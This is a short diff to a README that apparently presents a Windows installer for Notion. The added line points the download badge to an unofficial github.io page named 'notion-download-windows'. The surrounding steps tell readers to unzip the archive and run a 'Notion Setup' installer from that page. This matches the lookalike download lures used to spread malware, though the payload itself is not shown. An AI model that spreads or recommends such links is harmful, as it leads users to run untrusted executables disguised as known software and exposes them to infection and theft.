@@ -8,7 +8,7 @@ From personal planners to collaborative dashboards, Notion adapts to every workf
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](https://notion-download-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Notion Setup** installer on your Windows PC.  
